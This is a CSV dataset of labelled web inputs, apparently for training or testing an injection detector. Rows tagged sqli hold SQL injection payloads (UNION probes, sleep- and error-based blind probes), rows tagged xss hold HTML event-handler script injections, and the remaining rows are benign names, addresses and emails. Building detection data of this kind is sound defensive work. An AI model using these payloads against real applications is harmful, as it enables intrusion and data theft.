index,payload,type
2974,"-5798"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",sqli
414,or 'whatever' in   (  'whatever'  ) ,sqli
13004,stiefel8@spainbareback.eu,benign
19508,"<style>@keyframes x{}</style><select style=""animation-name:x"" onanimationstart=""alert(1)""></select>",xss
665,"""  )   or   (  ""x""  )    =    (  ""x",sqli
1811,"1' union all select null,null,null,null#",sqli
18170,<samp id=x tabindex=1 onfocus=alert(1)></samp>,xss
17181,"<fieldset onmouseleave=""alert(1)"">test</fieldset>",xss
14337,benidoleig,benign
13153,palau-saverdera,benign
3418,"1%'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  '%'  =  '",sqli
13370,rosset,benign
17599,"<html onkeydown=""alert(1)"" contenteditable>test</html>",xss
18153,"<s onmousedown=""alert(1)"">test</s>",xss
13668,strade_rosenthal@latiendadecolchones.kr,benign
2424,"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",sqli
19284,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tt id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></tt>",xss
11337,castil de vela,benign
2291,"1 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
12469,1450,benign
13114,3625,benign
12350,15317,benign
20156,"<title oncontextmenu=""alert(1)"">test</title>",xss
15221,bu7c2pi,benign
17862,"<plaintext onkeydown=""alert(1)"" contenteditable>test</plaintext>",xss
14503,9366,benign
12624,eldredge,benign
11489,methi,benign
345,declare @s varchar  (  200  )   select @s   =   0x77616974 ...,sqli
14967,bubnjar cangalaya,benign
230,select * from users where id  =  1. or 1  =  1 -- 1,sqli
17334,"<form ondblclick=""alert(1)"">test</form>",xss
12821,calle bendicion 160,benign
11440,18611,benign
15278,7.40E+15,benign
15345,<x OnXxx=1 ,xss
15200,2.97E+15,benign
17012,"<dl ondblclick=""alert(1)"">test</dl>",xss
607,or '1'  =  '1'--,sqli
18693,"<style>:target {color: red;}</style><slot id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></slot>",xss
15419,<select onchange=alert(1)><option>1<option>2,xss
11401,recabdador,benign
19273,"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><tbody id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></tbody>",xss
17587,<html id=x tabindex=1 onfocus=alert(1)></html>,xss
17864,"<plaintext onkeyup=""alert(1)"" contenteditable>test</plaintext>",xss
16566,"<details oncontextmenu=""alert(1)"">test</details>",xss
14088,4.89E+14,benign
3740,select   (  case when   (  4636  =  1108  )   then 1 else 4636*  (  select 4636 from master..sysdatabases  )   end  )  --,sqli
12358,marla,benign
11732,micr6pil8,benign
2032,1'  )   where 8429  =  8429,sqli
20348,"<var oncontextmenu=""alert(1)"">test</var>",xss
3797,"1"" where 3484  =  3484 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
16480,"<datalist onmouseleave=""alert(1)"">test</datalist>",xss
15570,"<applet draggable=""true"" ondragstart=""alert(1)"">test</applet>",xss
15533,"<acronym onpaste=""alert(1)"" contenteditable>test</acronym>",xss
18948,"<style>:target {transform: rotate(180deg);}</style><nobr id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></nobr>",xss
19325,"<style>@keyframes x{}</style><blockquote style=""animation-name:x"" onanimationend=""alert(1)""></blockquote>",xss
2751,-1700%' or 4149  =  3391#,sqli
3061,-7239' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and 'cswv'  =  'cswv,sqli
20873,"*{color:red}</style>//[""'`-->]]>]</div>",xss
16043,"<body onclick=""alert(1)"">test</body>",xss
18050,"<rt oncopy=""alert(1)"" contenteditable>test</rt>",xss
14838,trissenaar@tetdevelocidad.uk,benign
924,-9446   )    )    as wmrq where 3705  =  3705 union all select 3705#,sqli
2847,end and    (    (   6874  =  6874,sqli
3631,"-8988""   )    )    or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   ""dyxh"" like ""dyxh",sqli
16754,"<div draggable=""true"" contenteditable>drag me</div><dir ondrop=alert(1) contenteditable>drop here</dir>",xss
1833,"1%'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
852,"1"" where 4281  =  4281",sqli
19089,"<style>@keyframes slidein {}</style><nav style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></nav>",xss
1525,"1' or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",sqli
3617,"-7812'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ttvo'  =  'ttvo",sqli
19557,"<style>@keyframes x{}</style><track style=""animation-name:x"" onanimationend=""alert(1)""></track>",xss
991,"1' union all select null,null,null,null--",sqli
12572,roccardi.betten@carrillo-de-albornoz.mil,benign
19511,"<style>@keyframes x{}</style><slot style=""animation-name:x"" onanimationend=""alert(1)""></slot>",xss
370,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,sqli
1756,"-5771'   )    )    union all select 2833,2833,2833,2833,2833,2833--",sqli
17252,"<font draggable=""true"" ondragend=""alert(1)"">test</font>",xss
2804,"1""  )   where 4822  =  4822 union all select null,null,null,null,null,null,null,null,null,null--",sqli
2934,"1   )    )    as rpwt where 4103  =  4103 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
13568,muogalindo,benign
15499,"<abbr onmouseover=""alert(1)"">test</abbr>",xss
16987,"<div onmouseleave=""alert(1)"">test</div>",xss
17557,"<hr onbeforecopy=""alert(1)"" contenteditable>test</hr>",xss
16884,"<div draggable=""true"" contenteditable>drag me</div><rtc ondrop=alert(1) contenteditable>drop here</rtc>",xss
2251,"1""   )    )     )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (     (  ""ipqw"" like ""ipqw",sqli
16090,<br onfocusout=alert(1) tabindex=1 id=x></br><input autofocus>,xss
20556,<svg/onload=alert(1),xss
11386,lurlene,benign
248,0 or 1  =  1,sqli
17461,"<head onbeforecopy=""alert(1)"" contenteditable>test</head>",xss
16656,<dir id=x tabindex=1 onfocus=alert(1)></dir>,xss
2475,"-5706""   )    )    union all select 2013,2013,2013,2013#",sqli
11870,3814,benign
2990,-1886' where 5518  =  5518 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,sqli
310," select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",sqli
17407,"<frameset onmouseenter=""alert(1)"">test</frameset>",xss
15638,<article id=x tabindex=1 onfocus=alert(1)></article>,xss
17782,"<input onmousedown=""alert(1)"">test</input>",xss
17674,"<iframe onpaste=""alert(1)"" contenteditable>test</iframe>",xss
16296,"<col draggable=""true"" ondragenter=""alert(1)"">test</col>",xss
14708,landau silvestre,benign
17353,"<frame draggable=""true"" ondragend=""alert(1)"">test</frame>",xss
2868,select   (  case when   (  9299  =  2760  )   then 1 else 9299*  (  select 9299 from master..sysdatabases  )   end  )  --,sqli
16123,"<button onkeydown=""alert(1)"" contenteditable>test</button>",xss
14910,p7g2na,benign
14315,lloyd-pack-partain@elalamorestaurante.ir,benign
12242,lzaro,benign
2068,"-3104"" union all select 5717,5717,5717,5717,5717,5717,5717,5717,5717--",sqli
16805,"<div draggable=""true"" contenteditable>drag me</div><ins ondragover=alert(1) contenteditable>drop here</ins>",xss
11967,lawlik@housemovie.lk,benign
20137,"<time onmouseover=""alert(1)"">test</time>",xss
11884,toddi,benign
1503,"-7884"" where 3297  =  3297 or 2492  =  6158",sqli
13176,9.55E+15,benign
13486,promanar,benign
16017,"<blockquote onmousedown=""alert(1)"">test</blockquote>",xss
3001,"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",sqli
12151,narita@deportechino.an,benign
3135,"1""  )   union all select null,null,null,null,null,null--",sqli
435," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sqli
3696,1'   )    )    as yyud where 4934  =  4934,sqli
17220,"<figure draggable=""true"" ondragend=""alert(1)"">test</figure>",xss
3920,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,sqli
13563,7315,benign
3070,"1%""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
15713,"<audio onbeforecopy=""alert(1)"" contenteditable>test</audio>",xss
12743,34260,benign
269," select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",sqli
13770,argujillo,benign
20788,"<div id=""109""><svg xmlns=""http://www.w3.org/2000/svg"">",xss
18746,"<style>:target {color:red;}</style><caption id=x style=""transition:color 1s"" ontransitionend=alert(1)></caption>",xss
16474,<datalist onfocusout=alert(1) tabindex=1 id=x></datalist><input autofocus>,xss
737,or 1  =  1 /*,sqli
3713,"1'  )   where 7093  =  7093 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
11499,robledo,benign
1566,"1"" where 3678  =  3678 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",sqli
15708,"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>",xss
16003,<blockquote id=x tabindex=1 onfocusin=alert(1)></blockquote>,xss
2005,1'+  (  select gqez where 3704  =  3704,sqli
14478,mo3tren04,benign
1218,"1%""   )    )    union all select null,null,null,null,null,null#",sqli
13390,malott,benign
18118,"<ruby onkeydown=""alert(1)"" contenteditable>test</ruby>",xss
12246,7751,benign
20582,<script x> alert(1) </script 1=2,xss
19021,"<style>@keyframes slidein {}</style><bdo style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></bdo>",xss
19101,"<style>@keyframes slidein {}</style><param style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></param>",xss
19387,"<style>@keyframes x{}</style><footer style=""animation-name:x"" onanimationend=""alert(1)""></footer>",xss
101," select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",sqli
19416,"<style>@keyframes x{}</style><input style=""animation-name:x"" onanimationstart=""alert(1)""></input>",xss
3176,"select * from generate_series  (  7407,7407,case when   (  7407  =  6562  )   then 1 else 0 end  )   limit 1--",sqli
16773,"<div draggable=""true"" contenteditable>drag me</div><font ondragover=alert(1) contenteditable>drop here</font>",xss
1926,1'   )    )    as plgq where 1121  =  1121,sqli
2335,"-2448%""  )   or 3038  =  3038",sqli
12596,solonitsin3@neotelecom.fi,benign
572,"admin"" or 1  =  1--",sqli
13085,yamasaki@multaspendientes.eg,benign
11411,arriharn espinet,benign
544," select * from users where id  =  1<@<@ union select 1,version  (    )   -- 1",sqli
2520,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )   -- sztf",sqli
19080,"<style>@keyframes slidein {}</style><main style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></main>",xss
15160,"c/ codigo correspondencia oficial correos-telegrafos 71, 10d",benign
19996,<textarea oncut=alert(1) autofocus>XSS</textarea>,xss
14173,thain,benign
16084,<br onblur=alert(1) tabindex=1 id=x></br><input autofocus>,xss
11668,"umbria, 143,",benign
18567,"<style oncut=""alert(1)"" contenteditable>test</style>",xss
15424,alert&#40;1&#41,xss
3338,"1""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""fogb"" like ""fogb",sqli
2088,"-5132%""   )    )    or 3038  =  3038",sqli
17231,"<figure onbeforecut=""alert(1)"" contenteditable>test</figure>",xss
3459,"1%' union all select null,null,null,null,null,null,null,null,null,null--",sqli
14129,ollo,benign
13002,"etorbidea askatasuna 170, 8?a",benign
17247,"<figure onmouseout=""alert(1)"">test</figure>",xss
18714,"<style>:target {color: red;}</style><title id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></title>",xss
19846,<svg><xmp onload=alert(1)></xmp>,xss
20801,"<div id=""116""><div id=""x"">x</div>",xss
17508,"<header onmouseleave=""alert(1)"">test</header>",xss
18884,"<style>:target {transform: rotate(180deg);}</style><br id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></br>",xss
2356,-5534 or 1983  =  5721#,sqli
14581,fuente el saz,benign
3509,"-9661""   )    )     )   union all select 2158,2158,2158--",sqli
18193,"<script draggable=""true"" ondrag=""alert(1)"">test</script>",xss
16219,"<center onkeydown=""alert(1)"" contenteditable>test</center>",xss
1739,"1'  )   as rqzz where 4987  =  4987 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
2257,"-8002'   )    )     )   union all select 6647,6647,6647--",sqli
13053,yarela,benign
15987,"<blink onmouseleave=""alert(1)"">test</blink>",xss
16225,"<center onmousemove=""alert(1)"">test</center>",xss
16784,"<div draggable=""true"" contenteditable>drag me</div><h1 ondrop=alert(1) contenteditable>drop here</h1>",xss
14198,7.39E+15,benign
12027,32790960k,benign
673, or username like '%,sqli
3217,"select * from generate_series  (  3990,3990,case when   (  3990  =  9597  )   then 1 else 0 end  )   limit 1--",sqli
19527,"<style>@keyframes x{}</style><sub style=""animation-name:x"" onanimationend=""alert(1)""></sub>",xss
19686,"<svg onclick=""alert(1)"">test</svg>",xss
14929,6ong6,benign
15990,"<blink onmouseover=""alert(1)"">test</blink>",xss
2258,select   (  case when   (  9732  =  7136  )   then 9732 else 9732*  (  select 9732 from information_schema.character_sets  )   end  )  #,sqli
11679,saleh,benign
19411,"<style>@keyframes x{}</style><image style=""animation-name:x"" onanimationend=""alert(1)""></image>",xss
1359,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'rxxb'  =  'rxxb",sqli
3539,1'  )   or sleep  (  5  )  #,sqli
13036,casarabonela,benign
13850,kumushalieva@hiperbarcelona.ly,benign
1715,"1  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  5098  =  5098",sqli
11629,ocallaghan@asyra.li,benign
334," select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",sqli
2450,-9690 union all select 7217#,sqli
474," select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",sqli
16823,"<div draggable=""true"" contenteditable>drag me</div><main ondragover=alert(1) contenteditable>drop here</main>",xss
18426,<spacer id=x tabindex=1 onactivate=alert(1)></spacer>,xss
20264,"<tt onmouseout=""alert(1)"">test</tt>",xss
2406,-8465' where 5242  =  5242 or 3806  =  7423--,sqli
17777,<input onfocusout=alert(1) id=x><input autofocus>,xss
20418,<wbr id=x tabindex=1 onbeforeactivate=alert(1)></wbr>,xss
11704,4560,benign
14990,ambiental,benign
1615,1'  )   as jdmh where 6175  =  6175 rlike sleep  (  5  )  #,sqli
1433,"1' and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'jjxn'  =  'jjxn",sqli
